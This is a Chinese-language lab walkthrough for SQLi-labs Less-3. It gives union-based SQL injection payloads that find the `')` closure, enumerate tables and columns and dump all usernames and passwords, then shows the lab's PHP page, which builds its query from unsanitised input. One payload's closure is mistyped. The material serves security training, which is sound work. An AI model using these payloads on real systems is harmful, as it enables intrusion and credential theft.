# 括号闭合

# 1、测试注入点与闭合
## `?id=1'` 
### 出现报错,确认存在注入
## `?id=1) and 1=1 --+`(页面正常);`?id=1) and 1=2 --+`(页面异常)
### 闭合符是`')`
# 2、判断字段数
## `?id=1') order by 3 --+`(页面正常);`?id=1') order by 4 --+`(页面报错)
### 字段数为3
# 3、联合查询找显示位
## `?id=-1') union select 1,2,3 --+`(页面显示2和3)
# 4、爆出数据库和版本
## `?id=-1)' union select 1,database(),version() --+`(回显security和版本号)
# 5、爆出表名
## `?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`(回显emails,referers,uagents,users)
# 6、爆出字段名
## `?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`
# 7、爆出账号密码
## `?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+`(直接拿到所有账号密码)


# 源码
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-3 Error Based- String (with Twist) </title>

</head>

<body bgcolor="#000000">

<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>


</font> </div></br></br></br><center>
<img src="../images/Less-3.jpg" /></center>
</body>
</html>

```